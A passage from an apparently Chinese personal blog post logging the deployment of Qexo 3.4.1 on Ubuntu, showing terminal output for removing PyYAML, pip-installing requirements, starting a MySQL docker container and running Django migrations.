uninstall-distutils-installed-package<br><br>× Cannot uninstall PyYAML 3.12<br>╰─&gt; It is a distutils installed project and thus we cannot accurately determine <span class="hljs-built_in">which</span> files belong to it <span class="hljs-built_in">which</span> would lead to only a partial uninstall.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="小插曲：包管理器来卸载PyYAML"><a href="#小插曲：包管理器来卸载PyYAML" class="headerlink" title="小插曲：包管理器来卸载PyYAML"></a>小插曲：包管理器来卸载PyYAML</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># sudo apt-get remove python3-yaml</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>The following packages were automatically installed and are no longer required:<br>  apturl-common distro-info gir1.2-dbusmenu-glib-0.4 gir1.2-dee-1.0 gir1.2-javascriptcoregtk-4.0 gir1.2-unity-5.0 gir1.2-webkit2-4.0<br>  gnome-session-bin gnome-session-common gnome-software-common gnome-startup-applications libappstream-glib8 libnetplan0<br>  python3-dateutil python3-debconf python3-netifaces<br>Use <span class="hljs-string">&#x27;sudo apt autoremove&#x27;</span> to remove them.<br>The following additional packages will be installed:<br>  python3-update-manager<br>The following packages will be REMOVED:<br>  apturl gnome-software gnome-software-plugin-snap nautilus-share netplan.io nplan python3-yaml software-properties-gtk<br>  ubuntu-advantage-desktop-daemon ubuntu-advantage-tools ubuntu-minimal ubuntu-release-upgrader-gtk ubuntu-software update-manager<br>  update-manager-core update-notifier update-notifier-common<br>The following packages will be upgraded:<br>  python3-update-manager<br>1 upgraded, 0 newly installed, 17 to remove and 1 not upgraded.<br>Need to get 35.4 kB of archives.<br>After this operation, 8,772 kB disk space will be freed.<br>Do you want to <span class="hljs-built_in">continue</span>? [Y/n] y<br>Get:1 https://mirrors.aliyun.com/ubuntu bionic-updates/main amd64 python3-update-manager all 1:18.04.13.1 [35.4 kB]<br>Fetched 35.4 kB <span class="hljs-keyword">in</span> 0s (142 kB/s)                  <br>(Reading database ... 279567 files and directories currently installed.)<br>Removing nautilus-share (0.7.3-2ubuntu3) ...<br>Removing apturl (0.5.2ubuntu14.2) ...<br>Removing gnome-software-plugin-snap (3.28.1-0ubuntu4.18.04.15) ...<br>Removing ubuntu-software (3.28.1-0ubuntu4.18.04.15) ...<br>Removing gnome-software (3.28.1-0ubuntu4.18.04.15) ...<br>Removing ubuntu-minimal (1.417.5) ...<br>Removing nplan (0.99-0ubuntu3~18.04.5) ...<br>Removing netplan.io (0.99-0ubuntu3~18.04.5) ...<br>dpkg: warning: <span class="hljs-keyword">while</span> removing netplan.io, directory <span class="hljs-string">&#x27;/usr/share/netplan/netplan/cli/commands&#x27;</span> not empty so not removed<br>dpkg: warning: <span class="hljs-keyword">while</span> removing netplan.io, directory <span class="hljs-string">&#x27;/etc/netplan&#x27;</span> not empty so not removed<br>Removing software-properties-gtk (0.96.24.32.22) ...<br>Removing ubuntu-advantage-desktop-daemon (1.10.ubuntu0.18.04.1~esm1) ...<br>Removing ubuntu-advantage-tools (28.1~18.04) ...<br>Removing update-manager (1:18.04.11.13) ...<br>Removing update-notifier (3.192.1.19) ...<br>Removing update-notifier-common (3.192.1.19) ...<br>Removing update-manager-core (1:18.04.11.13) ...<br>dpkg: warning: <span class="hljs-keyword">while</span> removing update-manager-core, directory <span class="hljs-string">&#x27;/var/lib/update-manager&#x27;</span> not empty so not removed<br>Removing python3-yaml (3.12-1build2) ...<br>Removing ubuntu-release-upgrader-gtk (1:18.04.45) ...<br>(Reading database ... 278835 files and directories currently installed.)<br>Preparing to unpack .../python3-update-manager_1%3a18.04.13.1_all.deb ...<br>Unpacking python3-update-manager (1:18.04.13.1) over (1:18.04.11.13) ...<br>Setting up python3-update-manager (1:18.04.13.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> shared-mime-info (1.9-2) ...<br>Unknown media <span class="hljs-built_in">type</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;all/all&#x27;</span><br>Unknown media <span class="hljs-built_in">type</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;all/allfiles&#x27;</span><br>Processing triggers <span class="hljs-keyword">for</span> gnome-menus (3.13.3-11ubuntu1.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> dbus (1.12.2-1ubuntu1.4) ...<br>Processing triggers <span class="hljs-keyword">for</span> hicolor-icon-theme (0.17-2) ...<br>Processing triggers <span class="hljs-keyword">for</span> mime-support (3.60ubuntu1) ...<br>Processing triggers <span class="hljs-keyword">for</span> desktop-file-utils (0.23-1ubuntu3.18.04.2) ...<br>Processing triggers <span class="hljs-keyword">for</span> libglib2.0-0:amd64 (2.56.4-0ubuntu0.18.04.9) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.8.3-2ubuntu0.1) ...<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="回到主线-6"><a href="#回到主线-6" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached Django-3.2.25-py3-none-any.whl.metadata (4.1 kB)<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached PyMySQL-1.0.2-py3-none-any.whl.metadata (5.1 kB)<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached boto3-1.34.44-py3-none-any.whl.metadata (6.6 kB)<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached requests-2.31.0-py3-none-any.whl.metadata (4.6 kB)<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached PyGithub-2.2.0-py3-none-any.whl.metadata (3.8 kB)<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached python_gitlab-4.4.0-py3-none-any.whl.metadata (7.7 kB)<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached html2text-2020.1.16-py3-none-any.whl.metadata (4.3 kB)<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)<br>Requirement already satisfied: urllib3==1.26.18 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 9)) (1.26.18)<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached Markdown-3.5.2-py3-none-any.whl.metadata (7.0 kB)<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached djongo5-1.3.9-py3-none-any.whl.metadata (1.9 kB)<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached django_cors_headers-4.1.0-py3-none-any.whl.metadata (16 kB)<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (9.7 kB)<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached dnspython-2.2.1-py3-none-any.whl.metadata (4.9 kB)<br>Requirement already satisfied: sqlparse==0.2.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 15)) (0.2.4)<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.4 kB)<br>Requirement already satisfied: cryptography==42.0.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 17)) (42.0.4)<br>Collecting pyopenssl==24.0.0 (from -r requirements.txt (line 18))<br>  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)<br>Collecting oss2==2.18.4 (from -r requirements.txt (line 19))<br>  Using cached oss2-2.18.4-py3-none-any.whl<br>Collecting beautifulsoup4==4.12.3 (from -r requirements.txt (line 20))<br>  Using cached beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)<br>Collecting upyun==2.5.5 (from -r requirements.txt (line 21))<br>  Using cached upyun-2.5.5-py3-none-any.whl<br>Collecting asgiref&lt;4,&gt;=3.3.2 (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Using cached asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)<br>Requirement already satisfied: pytz <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from Django==3.2.25-&gt;-r requirements.txt (line 1)) (2024.2)<br>Collecting botocore&lt;1.35.0,&gt;=1.34.44 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached botocore-1.34.162-py3-none-any.whl.metadata (5.7 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-1.0.1-py3-none-any.whl.metadata (7.6 kB)<br>Collecting s3transfer&lt;0.11.0,&gt;=0.10.0 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached s3transfer-0.10.3-py3-none-any.whl.metadata (1.7 kB)<br>Collecting charset-normalizer&lt;4,&gt;=2 (from requests==2.31.0-&gt;-r requirements.txt (line 4))<br>  Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)<br>Requirement already satisfied: idna&lt;4,&gt;=2.5 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2.6)<br>Requirement already satisfied: certifi&gt;=2017.4.17 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2018.1.18)<br>Collecting pynacl&gt;=1.4.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)<br>Collecting pyjwt&gt;=2.4.0 (from pyjwt[crypto]&gt;=2.4.0-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyJWT-2.9.0-py3-none-any.whl.metadata (3.0 kB)<br>Requirement already satisfied: typing-extensions&gt;=4.0.0 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5)) (4.12.2)<br>Collecting Deprecated (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)<br>Collecting requests-toolbelt&gt;=0.10.1 (from python-gitlab==4.4.0-&gt;-r requirements.txt (line 6))<br>  Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)<br>Collecting importlib-metadata&gt;=4.4 (from Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Using cached importlib_metadata-8.5.0-py3-none-any.whl.metadata (4.8 kB)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (1.17.1)<br>Requirement already satisfied: crcmod&gt;=1.7 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from oss2==2.18.4-&gt;-r requirements.txt (line 19)) (1.7)<br>Collecting pycryptodome&gt;=3.4.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)<br>Collecting aliyun-python-sdk-kms&gt;=2.4.1 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl.metadata (1.5 kB)<br>Collecting aliyun-python-sdk-core&gt;=2.13.12 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun_python_sdk_core-2.16.0-py3-none-any.whl<br>Requirement already satisfied: six <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from oss2==2.18.4-&gt;-r requirements.txt (line 19)) (1.16.0)<br>Requirement already satisfied: soupsieve&gt;1.2 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from beautifulsoup4==4.12.3-&gt;-r requirements.txt (line 20)) (2.6)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-0.10.0-py2.py3-none-any.whl.metadata (8.0 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.35.0,&gt;=1.34.44-&gt;boto3==1.34.44-&gt;-r requirements.txt (line 3)) (2.6.1)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cffi&gt;=1.12-&gt;cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (2.22)<br>Requirement already satisfied: zipp&gt;=3.20 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from importlib-metadata&gt;=4.4-&gt;Markdown==3.5.2-&gt;-r requirements.txt (line 10)) (3.20.2)<br>Requirement already satisfied: wrapt&lt;2,&gt;=1.10 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from Deprecated-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5)) (1.16.0)<br>Using cached Django-3.2.25-py3-none-any.whl (7.9 MB)<br>Using cached PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>Using cached boto3-1.34.44-py3-none-any.whl (139 kB)<br>Using cached requests-2.31.0-py3-none-any.whl (62 kB)<br>Using cached PyGithub-2.2.0-py3-none-any.whl (350 kB)<br>Using cached python_gitlab-4.4.0-py3-none-any.whl (138 kB)<br>Using cached html2text-2020.1.16-py3-none-any.whl (32 kB)<br>Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (736 kB)<br>Using cached Markdown-3.5.2-py3-none-any.whl (103 kB)<br>Using cached djongo5-1.3.9-py3-none-any.whl (51 kB)<br>Using cached django_cors_headers-4.1.0-py3-none-any.whl (12 kB)<br>Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (526 kB)<br>Using cached dnspython-2.2.1-py3-none-any.whl (269 kB)<br>Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)<br>Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)<br>Using cached beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)<br>Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl (99 kB)<br>Using cached asgiref-3.8.1-py3-none-any.whl (23 kB)<br>Using cached botocore-1.34.162-py3-none-any.whl (12.5 MB)<br>Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)<br>Using cached importlib_metadata-8.5.0-py3-none-any.whl (26 kB)<br>Using cached jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)<br>Using cached PyJWT-2.9.0-py3-none-any.whl (22 kB)<br>Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)<br>Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)<br>Using cached s3transfer-0.10.3-py3-none-any.whl (82 kB)<br>Using cached Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: PyYAML, PyMySQL, pymongo, pyjwt, pycryptodome, psycopg2-binary, jmespath, importlib-metadata, html2text, dnspython, Deprecated, charset-normalizer, beautifulsoup4, asgiref, requests, pynacl, Markdown, Django, botocore, upyun, s3transfer, requests-toolbelt, pyopenssl, djongo5, django-cors-headers, aliyun-python-sdk-core, python-gitlab, PyGithub, boto3, aliyun-python-sdk-kms, oss2<br>Successfully installed Deprecated-1.2.14 Django-3.2.25 Markdown-3.5.2 PyGithub-2.2.0 PyMySQL-1.0.2 PyYAML-6.0.1 aliyun-python-sdk-core-2.16.0 aliyun-python-sdk-kms-2.16.5 asgiref-3.8.1 beautifulsoup4-4.12.3 boto3-1.34.44 botocore-1.34.162 charset-normalizer-3.4.0 django-cors-headers-4.1.0 djongo5-1.3.9 dnspython-2.2.1 html2text-2020.1.16 importlib-metadata-8.5.0 jmespath-0.10.0 oss2-2.18.4 psycopg2-binary-2.9.9 pycryptodome-3.21.0 pyjwt-2.9.0 pymongo-3.13.0 pynacl-1.5.0 pyopenssl-24.0.0 python-gitlab-4.4.0 requests-2.31.0 requests-toolbelt-1.0.0 s3transfer-0.10.3 upyun-2.5.5<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option <span class="hljs-keyword">if</span> you know what you are doing and want to suppress this warning.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="主线2"><a href="#主线2" class="headerlink" title="主线2"></a>主线2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py makemigrations</span><br>获取本地配置文件成功, 使用本地数据库配置<br>[02/Nov/2024 11:26:11] ERROR: Language获取失败, 默认为zh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:26:11] ERROR: 获取PROVIDER时出错: 跳过(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>当前环境: 本地<br>/usr/local/lib/python3.8/dist-packages/django/core/management/commands/makemigrations.py:105: RuntimeWarning: Got an error checking a consistent migration <span class="hljs-built_in">history</span> performed <span class="hljs-keyword">for</span> database connection <span class="hljs-string">&#x27;default&#x27;</span>: (2003, <span class="hljs-string">&quot;Can&#x27;t connect to MySQL server on &#x27;192.168.20.201&#x27; ([Errno 111] Connection refused)&quot;</span>)<br>  warnings.warn(<br>No changes detected<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="小插曲：启动mysql容器"><a href="#小插曲：启动mysql容器" class="headerlink" title="小插曲：启动mysql容器"></a>小插曲：启动mysql容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker ps </span><br>CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker ps  -a</span><br>CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS                      PORTS     NAMES<br>933dad3ceaa4   mysql     <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   31 hours ago   Exited (0) 16 hours ago               qexo<br>b5a90d496b13   mysql     <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   31 hours ago   Exited (130) 31 hours ago             hungry_swartz<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># netstat -nltp |grep 3306</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker start  qexo</span><br>qexo<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker ps </span><br>CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS         PORTS                                                  NAMES<br>933dad3ceaa4   mysql     <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   31 hours ago   Up 3 seconds   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp   qexo<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># netstat -nltp |grep 3306</span><br>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      13530/docker-proxy  <br>tcp6       0      0 :::3306                 :::*                    LISTEN      13537/docker-proxy  <br></code></pre></td></tr></table></figure><h3 id="回到主线-7"><a href="#回到主线-7" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py makemigrations</span><br>获取本地配置文件成功, 使用本地数据库配置<br>[02/Nov/2024 11:28:50] ERROR: Language获取失败, 默认为zh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:28:50] ERROR: 获取PROVIDER时出错: 跳过(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>当前环境: 本地<br>No changes detected<br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py migrate</span><br>获取本地配置文件成功, 使用本地数据库配置<br>[02/Nov/2024 11:29:40] ERROR: Language获取失败, 默认为zh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:29:40] ERROR: 获取PROVIDER时出错: 跳过(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>当前环境: 本地<br>Operations to perform:<br>  Apply all migrations: auth, contenttypes, hexoweb, sessions<br>Running migrations:<br>  Applying contenttypes.0001_initial... OK<br>  Applying contenttypes.0002_remove_content_type_name... OK<br>  Applying auth.0001_initial... OK<br>  Applying auth.0002_alter_permission_name_max_length... OK<br>  Applying auth.0003_alter_user_email_max_length... OK<br>  Applying auth.0004_alter_user_username_opts... OK<br>  Applying auth.0005_alter_user_last_login_null... OK<br>  Applying auth.0006_require_contenttypes_0002... OK<br>  Applying auth.0007_alter_validators_add_error_messages... OK<br>  Applying 